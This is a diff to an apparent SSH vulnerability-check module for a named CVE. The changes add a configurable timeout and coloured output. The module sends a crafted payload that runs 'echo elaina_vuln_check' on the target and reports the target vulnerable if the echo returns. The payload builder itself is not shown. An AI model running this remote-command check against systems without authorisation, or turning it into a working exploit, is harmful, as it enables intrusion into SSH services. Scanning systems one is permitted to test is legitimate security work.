@@ -1,6 +1,9 @@
+#!/usr/bin/env python3
+
 import socket
 import struct
 import os
+from config import DEFAULT_TIMEOUT
 from module.other import Other
 
 class ElainaCVE202532433:
@@ -9,6 +12,7 @@ class ElainaCVE202532433:
         self.target = args.target
         self.port = args.port or 22
         self.verbose = args.verbose
+        self.timeout = DEFAULT_TIMEOUT
         self.module_name = os.path.splitext(os.path.basename(__file__))[0]
         self.printer = Other()
 
@@ -33,11 +37,10 @@ class ElainaCVE202532433:
 
     def send_payload(self, ip, port, cmd):
         try:
-            s = socket.create_connection((ip, port), timeout=5)
+            s = socket.create_connection((ip, port), timeout=self.timeout)
             banner = s.recv(1024).decode(errors="ignore")
             if self.verbose:
                 print(f"[+] SSH Banner: {banner.strip()}")
-
             payload = self.create_payload(cmd.encode())
             s.send(payload)
             resp = s.recv(1024).decode(errors="ignore")
@@ -49,21 +52,23 @@ class ElainaCVE202532433:
     def run(self):
         result = {"vulnerable": False, "target": f"{self.target}:{self.port}"}
         if self.verbose:
-            print(f"[*] [Module: {self.module_name}] [Started Scan]")
+            colored_module = self.printer.color_text(self.module_name, "cyan")
+            print(f"[*] [Module: {colored_module}] [Started Scan]")
 
         cmd = "echo elaina_vuln_check"
         resp = self.send_payload(self.target, self.port, cmd)
 
+        colored_module = self.printer.color_text(self.module_name, "cyan")
+        colored_target = self.printer.color_text(f"{self.target}:{self.port}", "yellow")
+
         if "elaina_vuln_check" in resp:
             result["vulnerable"] = True
             result["response"] = resp
-            colored_mod = self.printer.color_text(self.module_name, "cyan")
-            colored_target = self.printer.color_text(f"{self.target}:{self.port}", "yellow")
-            print(f"[+] [Module: {colored_mod}] [Vulnerable] [Target: {colored_target}]")
+            status = self.printer.color_text("Vuln", "green")
+            print(f"[+] [Module: {colored_module}] [{status}] [Target: {colored_target}]")
         else:
-            colored_mod = self.printer.color_text(self.module_name, "cyan")
-            colored_target = self.printer.color_text(f"{self.target}:{self.port}", "red")
-            print(f"[-] [Module: {colored_mod}] [Not Vulnerable] [Target: {colored_target}]")
+            status = self.printer.color_text("Not Vuln", "red")
+            print(f"[-] [Module: {colored_module}] [{status}] [Target: {colored_target}]")
 
         return result
 
